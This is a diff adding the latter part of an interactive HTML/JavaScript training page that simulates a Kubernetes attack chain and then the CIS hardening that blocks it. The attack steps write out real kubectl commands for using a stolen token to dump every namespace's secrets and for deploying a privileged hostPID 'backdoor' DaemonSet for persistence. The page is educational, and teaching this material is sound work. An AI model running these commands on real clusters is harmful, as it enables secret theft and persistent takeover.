+    alert: "🔴 CLUSTER-ADMIN ACCESS CONFIRMED",
+    svgFn: () => {
+      animLine('conn-secret-api', '#ff1a3c', 2);
+      paintNode('node-api', '#ff1a3c', '#200008');
+      animLine('conn-api-rbac', '#ff1a3c', 1.5);
+      paintNode('node-rbac', '#ff1a3c', '#200008');
+      setEl('rbac-icon', 'textContent', '💀');
+      setEl('pwn-host', 'opacity', '1');
+    },
+    damage: 80
+  },
+  {
+    title: "Dump All Cluster Secrets",
+    desc: "With cluster-admin, you read every Secret across all namespaces — database passwords, API keys, TLS certs.",
+    lines: [
+      {t:'prompt', text:'kubectl --token=$TOKEN get secrets --all-namespaces'},
+      {t:'pause', ms:500},
+      {t:'out', text:'NAMESPACE    NAME                    TYPE', cls:'t-out-info'},
+      {t:'out', text:'default      db-credentials          Opaque', cls:'t-out-bad'},
+      {t:'out', text:'default      aws-access-keys         Opaque', cls:'t-out-bad'},
+      {t:'out', text:'kube-system  bootstrap-token-abc123  bootstrap.kubernetes.io/token', cls:'t-out-bad'},
+      {t:'out', text:'production   tls-cert                kubernetes.io/tls', cls:'t-out-bad'},
+      {t:'out', text:'production   stripe-api-key          Opaque', cls:'t-out-bad'},
+      {t:'pause', ms:400},
+      {t:'prompt', text:'kubectl --token=$TOKEN get secret db-credentials -o jsonpath=\'{.data.password}\' | base64 -d'},
+      {t:'out', text:'Pr0ductionP@ssw0rd!', cls:'t-out-bad'},
+      {t:'pause', ms:300},
+      {t:'out', text:'[+] 47 secrets dumped across 12 namespaces.', cls:'t-out-bad'},
+      {t:'out', text:'[+] Production DB password extracted.', cls:'t-out-bad'},
+    ],
+    btn: "Deploy Backdoor + Own Cluster →",
+    alert: "🔴 ALL SECRETS DUMPED — 47 secrets exposed",
+    svgFn: () => {
+      animLine('conn-rbac-cluster', '#ff1a3c', 2);
+      paintNode('node-cluster', '#ff1a3c', '#200008');
+      setEl('cluster-icon', 'textContent', '💀');
+    },
+    damage: 95
+  },
+  {
+    title: "Cluster Fully Owned",
+    desc: "You deploy a privileged DaemonSet that runs on every node. Persistent backdoor. Game over.",
+    lines: [
+      {t:'prompt', text:'# Deploy backdoor DaemonSet on every node'},
+      {t:'prompt', text:'kubectl --token=$TOKEN apply -f - <<EOF'},
+      {t:'out', text:'apiVersion: apps/v1', cls:'t-out-info'},
+      {t:'out', text:'kind: DaemonSet', cls:'t-out-info'},
+      {t:'out', text:'spec:', cls:'t-out-info'},
+      {t:'out', text:'  template:', cls:'t-out-info'},
+      {t:'out', text:'    spec:', cls:'t-out-info'},
+      {t:'out', text:'      hostPID: true', cls:'t-out-bad'},
+      {t:'out', text:'      containers:', cls:'t-out-info'},
+      {t:'out', text:'      - image: backdoor:latest', cls:'t-out-bad'},
+      {t:'out', text:'        securityContext:', cls:'t-out-info'},
+      {t:'out', text:'          privileged: true  # ← full access', cls:'t-out-bad'},
+      {t:'out', text:'EOF', cls:'t-out-info'},
+      {t:'pause', ms:600},
+      {t:'out', text:'daemonset.apps/backdoor created', cls:'t-out-bad'},
+      {t:'out', text:'', cls:''},
+      {t:'out', text:'[+] Backdoor running on ALL 3 nodes.', cls:'t-out-bad'},
+      {t:'out', text:'[+] Persistent access established.', cls:'t-out-bad'},
+      {t:'out', text:'[+] *** CLUSTER FULLY COMPROMISED ***', cls:'t-out-bad'},
+    ],
+    btn: "🏴 View Results",
+    alert: "💀 CLUSTER OWNED — PERSISTENT BACKDOOR DEPLOYED",
+    svgFn: () => {
+      setEl('pwn-cluster', 'opacity', '1');
+      ['node-pod','node-host','node-secret','node-api','node-rbac','node-cluster'].forEach(id => {
+        paintNode(id, '#ff1a3c', '#200008');
+      });
+    },
+    damage: 100
+  }
+];
+
+const DEF_STEPS = [
+  {
+    title: "Assess the Exposure",
+    desc: "Before hardening, you scan the cluster. Every pod is wide open. Let's fix this — starting with the biggest risk.",
+    lines: [
+      {t:'prompt', text:'kubectl get pod nginx -n cis-demo -o json | jq .spec.securityContext'},
+      {t:'out', text:'{}  # ← Empty! No security baseline.', cls:'t-out-bad'},
+      {t:'pause', ms:400},
+      {t:'prompt', text:'kubectl get pod nginx -n cis-demo -o json | jq .spec.hostNetwork,.spec.hostPID'},
+      {t:'out', text:'true   # ← hostNetwork sharing host stack!', cls:'t-out-bad'},
+      {t:'out', text:'true   # ← hostPID can see all host processes!', cls:'t-out-bad'},
+      {t:'pause', ms:400},
+      {t:'out', text:'[!] CRITICAL: 6 high-severity misconfigs found', cls:'t-out-bad'},
+      {t:'out', text:'[!] Pod can escape to host node', cls:'t-out-bad'},
+      {t:'out', text:'[*] Starting remediation...', cls:'t-out-good'},
+    ],
+    btn: "Apply SecurityContext →",
+    alert: "⚡ Assessment complete — 6 critical misconfigs found",
+    svgFn: () => { pulseNode('node-pod', 'def'); },
+    defended: 0
+  },
+  {
+    title: "Harden Pod SecurityContext",
+    desc: "Apply pod-level controls: drop host namespaces, enforce non-root, set RuntimeDefault seccomp. This closes container escape paths.",
+    lines: [
+      {t:'prompt', text:'# Apply pod-level SecurityContext (CIS 5.2.1/5.2.2/5.2.4/5.7.2/5.7.3)'},
+      {t:'out', text:'spec:', cls:'t-out-info'},
+      {t:'out', text:'  hostPID: false      # ✅ CIS 5.2.2', cls:'t-out-good'},
+      {t:'out', text:'  hostIPC: false      # ✅ CIS 5.2.2', cls:'t-out-good'},
+      {t:'out', text:'  hostNetwork: false  # ✅ CIS 5.2.4', cls:'t-out-good'},
+      {t:'out', text:'  securityContext:', cls:'t-out-info'},
+      {t:'out', text:'    runAsNonRoot: true     # ✅ CIS 5.2.6', cls:'t-out-good'},
+      {t:'out', text:'    runAsUser: 1000        # ✅ CIS 5.2.6', cls:'t-out-good'},
+      {t:'out', text:'    seccompProfile:', cls:'t-out-info'},
+      {t:'out', text:'      type: RuntimeDefault # ✅ CIS 5.7.2', cls:'t-out-good'},
+      {t:'pause', ms:500},
+      {t:'prompt', text:'kubectl apply -f hardened-pod.yaml'},
+      {t:'out', text:'pod/nginx configured', cls:'t-out-good'},
+      {t:'out', text:'[✅] Container escape path: CLOSED', cls:'t-out-good'},
+      {t:'out', text:'[✅] Host namespace sharing: BLOCKED', cls:'t-out-good'},
+    ],
+    btn: "Harden Container Capabilities →",
+    alert: "✅ Pod SecurityContext applied — host escape blocked",
+    svgFn: () => {
+      paintNode('node-pod', '#00d4ff', '#001520');
+      setEl('shield-pod', 'opacity', '1');
+      setEl('pod-status', 'fill', '#00d4ff');
+      setEl('pod-status', 'textContent', 'hardened | uid=1000');
+    },
+    defended: 1
+  },
+  {
+    title: "Drop All Capabilities",
+    desc: "Drop ALL Linux capabilities at the container level. Add back nothing. NET_RAW, SYS_ADMIN — all gone. CIS 5.2.1, 5.2.5, 5.2.7.",
+    lines: [
+      {t:'prompt', text:'# Container-level securityContext (CIS 5.2.1/5.2.5/5.2.7)'},
+      {t:'out', text:'    securityContext:', cls:'t-out-info'},
+      {t:'out', text:'      privileged: false               # ✅ CIS 5.2.1', cls:'t-out-good'},
+      {t:'out', text:'      allowPrivilegeEscalation: false  # ✅ CIS 5.2.5', cls:'t-out-good'},
+      {t:'out', text:'      runAsUser: 1000                  # ✅ CIS 5.2.6', cls:'t-out-good'},
+      {t:'out', text:'      capabilities:', cls:'t-out-info'},
+      {t:'out', text:'        drop: ["ALL"]  # ✅ CIS 5.2.7 — zero caps', cls:'t-out-good'},
+      {t:'out', text:'        add: []        # nothing added back', cls:'t-out-good'},
+      {t:'pause', ms:500},
+      {t:'prompt', text:'kubectl exec nginx -- grep CapEff /proc/1/status'},
+      {t:'out', text:'CapEff: 0000000000000000', cls:'t-out-good'},
+      {t:'out', text:'# ← All 41 capabilities dropped!', cls:'t-out-info'},
+      {t:'out', text:'[✅] Capability abuse: BLOCKED', cls:'t-out-good'},
+      {t:'out', text:'[✅] NET_RAW packet crafting: IMPOSSIBLE', cls:'t-out-good'},
+    ],
+    btn: "Lock Down RBAC →",
+    alert: "✅ All capabilities dropped — CapEff: 0000000000000000",
+    svgFn: () => {
+      paintNode('node-host', '#00d4ff', '#001520');
+      setEl('shield-host', 'opacity', '1');
+      setEl('host-icon', 'textContent', '🛡️');
+    },
+    defended: 2
+  },
+  {
+    title: "Fix RBAC — Remove cluster-admin",
+    desc: "Revoke the cluster-admin ClusterRoleBinding. Replace with a scoped Role: get/list pods only. CIS 5.1.1 and 5.1.3.",
+    lines: [
+      {t:'prompt', text:'# Delete the dangerous binding (CIS 5.1.1)'},
+      {t:'prompt', text:'kubectl delete clusterrolebinding non-compliant-crb'},
+      {t:'out', text:'clusterrolebinding.rbac.authorization.k8s.io "non-compliant-crb" deleted', cls:'t-out-good'},
+      {t:'pause', ms:400},
+      {t:'prompt', text:'# Create minimal scoped Role (CIS 5.1.3)'},
+      {t:'out', text:'rules:', cls:'t-out-info'},
+      {t:'out', text:'- apiGroups: [""]      # core only', cls:'t-out-good'},
+      {t:'out', text:'  resources: ["pods"]  # pods only', cls:'t-out-good'},
+      {t:'out', text:'  verbs: ["get","list"] # read-only', cls:'t-out-good'},
+      {t:'pause', ms:400},
+      {t:'prompt', text:'kubectl auth can-i delete secrets --as=system:serviceaccount:cis-demo:sa'},
+      {t:'out', text:'no', cls:'t-out-good'},
+      {t:'prompt', text:'kubectl auth can-i get pods --as=system:serviceaccount:cis-demo:sa'},
+      {t:'out', text:'yes', cls:'t-out-good'},
+      {t:'out', text:'[✅] Lateral privilege movement: BLOCKED', cls:'t-out-good'},
+      {t:'out', text:'[✅] Token theft = useless (no cluster-admin)', cls:'t-out-good'},
+    ],
+    btn: "Move Secrets to Files →",
+    alert: "✅ cluster-admin revoked — least privilege enforced",
+    svgFn: () => {
+      paintNode('node-rbac', '#00d4ff', '#001520');
+      paintNode('node-api', '#00d4ff', '#001520');
+      setEl('shield-rbac', 'opacity', '1');
+      setEl('shield-api', 'opacity', '1');
+      setEl('rbac-icon', 'textContent', '✅');
+      setEl('api-icon', 'textContent', '🔒');
+    },
+    defended: 3
+  },
+  {
+    title: "Secure Secrets — Files not Env Vars",
+    desc: "Remove secrets from environment variables. Mount them as read-only files. CIS 5.4.1 — secrets no longer leak into logs.",
+    lines: [
+      {t:'prompt', text:'# Before: secret in env (CIS 5.4.1 violation)'},
+      {t:'out', text:'env:', cls:'t-out-bad'},
+      {t:'out', text:'- name: DB_PASSWORD', cls:'t-out-bad'},
+      {t:'out', text:'  value: "Pr0ductionP@ssw0rd!"  # ❌ plaintext!', cls:'t-out-bad'},
+      {t:'pause', ms:400},
+      {t:'prompt', text:'# After: secret as mounted file'},
+      {t:'out', text:'volumeMounts:', cls:'t-out-good'},
+      {t:'out', text:'- name: db-secret', cls:'t-out-good'},
+      {t:'out', text:'  mountPath: /etc/secrets   # ✅', cls:'t-out-good'},
+      {t:'out', text:'  readOnly: true', cls:'t-out-good'},
+      {t:'pause', ms:400},
+      {t:'prompt', text:'kubectl exec nginx -- env | grep PASSWORD'},
+      {t:'out', text:'(no output)  # ✅ not in env', cls:'t-out-good'},
+      {t:'prompt', text:'kubectl exec nginx -- cat /etc/secrets/db-password'},
+      {t:'out', text:'[file exists — accessible to app only]', cls:'t-out-good'},
+      {t:'out', text:'[✅] Secret exposure via kubectl describe: BLOCKED', cls:'t-out-good'},
+    ],
+    btn: "Deploy NetworkPolicy →",
+    alert: "✅ Secrets secured — no longer in environment",
+    svgFn: () => {
+      paintNode('node-secret', '#00d4ff', '#001520');
+      setEl('shield-secret', 'opacity', '1');
+      setEl('secret-icon', 'textContent', '🔒');
+      animLine('def-conn2', '#00d4ff', 1.5);
+    },
+    defended: 4
+  },
+  {
+    title: "Deploy NetworkPolicy — Zero Trust",
+    desc: "Lock down all traffic. Ingress: port 8080 only. Egress: deny everything. Compromised pod can't reach API server. CIS 5.3.2.",
+    lines: [
+      {t:'prompt', text:'# Apply deny-all NetworkPolicy (CIS 5.3.2)'},
+      {t:'out', text:'apiVersion: networking.k8s.io/v1', cls:'t-out-info'},
+      {t:'out', text:'kind: NetworkPolicy', cls:'t-out-info'},
+      {t:'out', text:'spec:', cls:'t-out-info'},
+      {t:'out', text:'  policyTypes: [Ingress, Egress]', cls:'t-out-good'},
+      {t:'out', text:'  ingress:', cls:'t-out-info'},
+      {t:'out', text:'  - ports: [{port: 8080}]  # ✅ 8080 only', cls:'t-out-good'},
+      {t:'out', text:'  egress: []  # ✅ deny ALL outbound', cls:'t-out-good'},
+      {t:'pause', ms:500},
+      {t:'prompt', text:'kubectl exec nginx -- curl -sk --max-time 3 https://10.96.0.1/api'},
+      {t:'out', text:'curl: (28) Connection timed out  # ✅ BLOCKED!', cls:'t-out-good'},
+      {t:'pause', ms:300},
+      {t:'out', text:'[✅] API server unreachable from pod', cls:'t-out-good'},
+      {t:'out', text:'[✅] East-west lateral movement: BLOCKED', cls:'t-out-good'},
+      {t:'out', text:'[✅] Blast radius: CONTAINED to single pod', cls:'t-out-good'},
+      {t:'out', text:'', cls:''},
+      {t:'out', text:'*** CLUSTER HARDENED — ALL 6 CONTROLS ACTIVE ***', cls:'t-out-good'},
+    ],
+    btn: "🛡️ View Defense Summary",
+    alert: "✅ NETWORK ZERO-TRUST DEPLOYED — Cluster hardened",
+    svgFn: () => {
+      paintNode('node-cluster', '#00d4ff', '#001520');
+      setEl('shield-cluster', 'opacity', '1');
+      setEl('cluster-icon', 'textContent', '✅');
+      setEl('netpol-status', 'textContent', 'active');
+      setEl('netpol-icon', 'textContent', '✅');
+      paintNode('node-netpol', '#00d4ff', '#001520');
+      animLine('def-conn1', '#00d4ff', 1.5);
+    },
+    defended: 6
+  }
+];
+
+// ════════════════════════════════════════════════════════════
+// STATE
+// ════════════════════════════════════════════════════════════
+let mode = 'atk';
+let step = 0;
+let running = false;
+let particles = [];
+
+// ════════════════════════════════════════════════════════════
+// SVG HELPERS
+// ════════════════════════════════════════════════════════════
+function setEl(id, prop, val) {
+  const el = document.getElementById(id);
+  if (!el) return;
+  if (prop === 'textContent') el.textContent = val;
+  else if (prop === 'opacity') el.style.opacity = val;
+  else if (prop === 'fill') el.setAttribute('fill', val);
+  else el.setAttribute(prop, val);
+}
+
+function paintNode(id, strokeColor, fillColor) {
+  const el = document.getElementById(id);
+  if (!el) return;
+  el.style.transition = 'all 0.6s';
+  el.setAttribute('stroke', strokeColor);
+  el.setAttribute('stroke-width', '2');
+  el.setAttribute('fill', fillColor);
+  setTimeout(() => {
+    el.style.filter = `drop-shadow(0 0 8px ${strokeColor})`;
+  }, 100);
+}
+
+function pulseNode(id, type) {
+  const el = document.getElementById(id);
+  if (!el) return;
+  el.style.animation = type === 'atk' ? 'pulse-atk 1.5s infinite' : 'pulse-def 1.5s infinite';
+}
+
+function animLine(id, color, width) {
+  const el = document.getElementById(id);
+  if (!el) return;
+  el.setAttribute('stroke', color);
+  el.setAttribute('stroke-width', String(width));
+  el.setAttribute('opacity', '1');
+  // Animate dash offset
+  el.style.strokeDasharray = '5,3';
+  el.style.animation = 'dashMove 1s linear infinite';
+}
+
+// ════════════════════════════════════════════════════════════
+// PARTICLE SYSTEM
+// ════════════════════════════════════════════════════════════
+const canvas = document.getElementById('particle-canvas');
+const ctx = canvas.getContext('2d');
+
+function resizeCanvas() {
+  const c = canvas.parentElement;
+  canvas.width = c.offsetWidth;
+  canvas.height = c.offsetHeight;
+}
+
+function spawnParticle() {
+  const color = mode === 'atk' ? '#ff1a3c' : '#00d4ff';
+  particles.push({
+    x: Math.random() * canvas.width,
+    y: Math.random() * canvas.height,
+    vx: (Math.random() - 0.5) * 0.8,
+    vy: (Math.random() - 0.5) * 0.8,
+    life: 1, decay: 0.003 + Math.random() * 0.005,
+    size: 1 + Math.random() * 2,
+    color
+  });
+}
+
+function drawParticles() {
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+  particles = particles.filter(p => p.life > 0);
+  particles.forEach(p => {
+    ctx.save();
+    ctx.globalAlpha = p.life * 0.6;
+    ctx.fillStyle = p.color;
+    ctx.beginPath();
+    ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
+    ctx.fill();
+    ctx.restore();
+    p.x += p.vx; p.y += p.vy; p.life -= p.decay;
+  });
+  if (Math.random() < 0.3) spawnParticle();
+  requestAnimationFrame(drawParticles);
+}
+
+window.addEventListener('resize', resizeCanvas);
+resizeCanvas();
+drawParticles();
+
+// ════════════════════════════════════════════════════════════
+// TERMINAL TYPING
+// ════════════════════════════════════════════════════════════
+async function typeLines(lines) {
+  const term = document.getElementById('sp-terminal');
+  term.innerHTML = '';
+  for (const line of lines) {
+    if (line.t === 'pause') {
+      await sleep(line.ms);
+      continue;
+    }
+    const div = document.createElement('div');
+    div.className = 'line-appear';
+    if (line.t === 'prompt') {
+      div.innerHTML = `<span class="t-prompt">$ </span><span class="t-cmd">${escHtml(line.text)}</span>`;
+    } else {
+      div.className += ' ' + (line.cls || 't-out-muted');
+      div.textContent = line.text;
+    }
+    term.appendChild(div);
+    term.scrollTop = term.scrollHeight;
+    await sleep(60 + Math.random() * 80);
+  }
+}
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+function escHtml(s) { return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+// ════════════════════════════════════════════════════════════
+// RENDER STEP
+// ════════════════════════════════════════════════════════════
+function renderStep() {
+  const steps = mode === 'atk' ? ATK_STEPS : DEF_STEPS;
+  const s = steps[step];
+  if (!s) return;
+
+  // Update header
+  document.getElementById('sp-step-num').textContent = `STEP ${step+1} / ${steps.length}`;
+  document.getElementById('sp-title').textContent = s.title;
+  document.getElementById('sp-desc').textContent = s.desc;
+  document.getElementById('sb-stage').textContent = `${step+1}/${steps.length}`;
+
+  // Progress
+  const pct = ((step) / steps.length) * 100;
+  document.getElementById('progress-fill').style.width = pct + '%';
+
+  // Score
+  if (mode === 'atk') {
+    document.getElementById('sb-label2').textContent = 'DAMAGE';
+    document.getElementById('sb-val2').textContent = s.damage + '%';
+    document.getElementById('sb-label3').textContent = 'NODES HIT';
+    document.getElementById('sb-val3').textContent = step + '/6';
+  } else {
+    document.getElementById('sb-label2').textContent = 'BLAST RADIUS';
+    const risk = Math.max(0, 100 - s.defended * 16);
+    document.getElementById('sb-val2').textContent = risk + '%';
+    document.getElementById('sb-label3').textContent = 'CONTROLS';
+    document.getElementById('sb-val3').textContent = s.defended + '/6';
+  }
+
+  // Alert
+  const alert = document.getElementById('alert-banner');
+  alert.textContent = s.alert;
+  alert.classList.add('show');
+  setTimeout(() => alert.classList.remove('show'), 3000);
+
+  // Buttons
+  const actions = document.getElementById('sp-actions');
+  const isLast = step === steps.length - 1;
+  actions.innerHTML = `
+    <button class="act-btn primary" onclick="nextStep()" id="btn-next">${s.btn}</button>
+    ${step > 0 ? `<button class="act-btn secondary" onclick="prevStep()">← Back</button>` : ''}
+    <button class="act-btn secondary" onclick="returnToSelect()">✕ Menu</button>
+  `;
+
+  // SVG animation
+  if (s.svgFn) s.svgFn(step);
+
+  // Type terminal
+  typeLines(s.lines);
+}
+
+function nextStep() {
+  const steps = mode === 'atk' ? ATK_STEPS : DEF_STEPS;
+  if (step >= steps.length - 1) {
+    showVictory();
+    return;
+  }
+  step++;
+  renderStep();
+}
+
+function prevStep() {
+  if (step > 0) { step--; renderStep(); }
+}
+
+// ════════════════════════════════════════════════════════════
+// VICTORY
+// ════════════════════════════════════════════════════════════
+function showVictory() {
+  const v = document.getElementById('victory');
+  const isAtk = mode === 'atk';
+  document.getElementById('v-icon').textContent = isAtk ? '💀' : '🛡️';
+  document.getElementById('v-title').textContent = isAtk ? 'CLUSTER FULLY OWNED' : 'CLUSTER HARDENED';
+  document.getElementById('v-sub').textContent = isAtk
+    ? 'You exploited privileged:true, hostPID:true, a stolen service account token, and cluster-admin binding to own every namespace. This is real. This happens to misconfigured clusters every day.'
+    : 'You applied all 6 CIS controls. Blast radius is now contained to a single pod. Even if nginx is compromised, an attacker can\'t escape the container, can\'t reach the API server, and has no useful token.';
+  document.getElementById('progress-fill').style.width = '100%';
+
+  // Change victory buttons for defender
+  const vBtns = document.querySelector('.v-btns');
+  if (!isAtk) {
+    vBtns.innerHTML = `
+      <button class="rs-btn" style="background:#00d4ff;color:#000;font-family:'Orbitron',monospace;font-size:0.8rem;padding:0.8rem 1.8rem;border:none;cursor:pointer;border-radius:2px" onclick="switchMode()">Try as Attacker</button>
+      <button class="rs-btn" style="background:transparent;color:var(--muted);border:1px solid #333;font-family:'Share Tech Mono',monospace;font-size:0.78rem;padding:0.8rem 1.8rem;cursor:pointer;border-radius:2px" onclick="restartMode()">Defend Again</button>
+    `;
+  } else {
+    vBtns.innerHTML = `
+      <button class="rs-btn" style="background:var(--atk-primary);color:#000;font-family:'Orbitron',monospace;font-size:0.8rem;padding:0.8rem 1.8rem;border:none;cursor:pointer;border-radius:2px" onclick="switchMode()">Switch to Defender</button>
+      <button class="rs-btn" style="background:transparent;color:var(--muted);border:1px solid #333;font-family:'Share Tech Mono',monospace;font-size:0.78rem;padding:0.8rem 1.8rem;cursor:pointer;border-radius:2px" onclick="restartMode()">Attack Again</button>
+    `;
+  }
+  v.classList.add('show');
+}
+
+// ════════════════════════════════════════════════════════════
+// MODE MANAGEMENT
+// ════════════════════════════════════════════════════════════
+function startMode(m) {
+  mode = m;
+  step = 0;
+  document.getElementById('role-select').classList.add('exit');
+  setTimeout(() => {
+    document.getElementById('role-select').style.display = 'none';
+    setupMode();
+    document.getElementById('app').style.display = 'flex';
+    document.getElementById('app').classList.add('visible');
+    renderStep();
+  }, 600);
+}
+
+function setupMode() {
+  const app = document.getElementById('app');
+  app.className = 'visible app-' + mode;
+
+  if (mode === 'atk') {
+    document.getElementById('tb-mode').textContent = '⚔ ATTACKER';
+    document.getElementById('tb-title').textContent = 'K8s Cluster Exploitation Chain';
+    document.getElementById('tb-switch').textContent = '⇄ Switch to Defender';
+  } else {
+    document.getElementById('tb-mode').textContent = '🛡 DEFENDER';
+    document.getElementById('tb-title').textContent = 'K8s Cluster Hardening — CIS Benchmark';
+    document.getElementById('tb-switch').textContent = '⇄ Switch to Attacker';
+  }
+
+  // Reset SVG
+  resetSVG();
+}
+
+function resetSVG() {
+  const nodes = ['node-pod','node-host','node-secret','node-api','node-rbac','node-cluster','node-netpol'];
+  nodes.forEach(id => {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.setAttribute('stroke', mode === 'atk' ? '#2a3a4a' : '#1a3a4a');
+    el.setAttribute('stroke-width', '1.5');
+    el.setAttribute('fill', mode === 'atk' ? '#0a0a10' : '#050d15');
+    el.style.filter = '';
+    el.style.animation = '';
+  });
+  const lines = ['conn-atk-pod','conn-pod-host','conn-pod-secret','conn-secret-api','conn-api-rbac','conn-rbac-cluster','def-conn1','def-conn2'];
+  lines.forEach(id => {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.setAttribute('stroke-width', '0');
+    el.setAttribute('opacity', '0');
+  });
+  const shields = ['shield-pod','shield-host','shield-rbac','shield-secret','shield-api','shield-cluster'];
+  shields.forEach(id => setEl(id, 'opacity', '0'));
+  const pwns = ['pwn-pod','pwn-host','pwn-cluster'];
+  pwns.forEach(id => setEl(id, 'opacity', '0'));
+  // Reset icons
+  setEl('pod-icon', 'textContent', '📦');
+  setEl('host-icon', 'textContent', '🖥️');
+  setEl('secret-icon', 'textContent', '🔑');
+  setEl('api-icon', 'textContent', '⚙️');
+  setEl('rbac-icon', 'textContent', '🗝️');
+  setEl('cluster-icon', 'textContent', '🌐');
+  setEl('netpol-icon', 'textContent', '🚫');
+  setEl('netpol-status', 'textContent', 'none');
+  setEl('pod-status', 'fill', '#3a5a6a');
+  setEl('pod-status', 'textContent', 'privileged:true | root');
+}
+
+function switchMode() {
+  document.getElementById('victory').classList.remove('show');
+  mode = mode === 'atk' ? 'def' : 'atk';
+  step = 0;
+  setupMode();
+  renderStep();
+}
+
+function restartMode() {
+  document.getElementById('victory').classList.remove('show');
+  step = 0;
+  resetSVG();
+  renderStep();
+}
+
+function returnToSelect() {
+  document.getElementById('victory').classList.remove('show');
+  document.getElementById('app').classList.remove('visible');
+  document.getElementById('app').style.display = 'none';
+  const rs = document.getElementById('role-select');
+  rs.classList.remove('exit');
+  rs.style.display = 'flex';
+  step = 0;
+}
+
+// Add glitch style
+const style = document.createElement('style');
+style.textContent = `
+@keyframes dashMove{to{stroke-dashoffset:-20}}
+.app-atk #cluster-svg text#attacker-icon{animation:pulse-atk 1s infinite}
+.app-atk #cluster-svg{animation:none}
+.app-atk .cluster-canvas::after{
+  content:'';position:absolute;inset:0;pointer-events:none;
+  background:radial-gradient(ellipse at center,transparent 40%,rgba(255,26,60,0.04) 100%);
+}
+.app-def .cluster-canvas::after{
+  content:'';position:absolute;inset:0;pointer-events:none;
+  background:radial-gradient(ellipse at center,transparent 40%,rgba(0,212,255,0.04) 100%);
+}
+`;
+document.head.appendChild(style);
+</script>
+</body>
+</html>
